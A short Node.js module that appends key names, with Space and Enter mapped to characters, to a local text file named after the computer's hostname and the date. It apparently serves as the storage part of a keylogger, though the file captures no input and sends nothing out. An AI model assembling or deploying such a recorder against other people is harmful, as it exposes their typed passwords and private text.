const fs = require('fs');

const os = require('os');

const computer = os.hostname();

class FileMap {

    constructor(){ 

        this.fileName = `${computer}_${new Date().toLocaleDateString()}.txt`;

    }
    
    file_data(keyData){

        if(!keyData)return false;

        const data = this.rules(keyData);

        fs.appendFileSync(`./src/cacheFiles/${this.fileName}`, data);
    
    }

    rules(keyWord){

        const data = {
            
            "Space" : ()=>{
            
                return  " ";                
            
            },

            "Enter": ()=>{
                
                return "\r\n";

            },
        
        }
        
        return data[keyWord] ? data[keyWord]() : keyWord;

    }

}

module.exports = FileMap;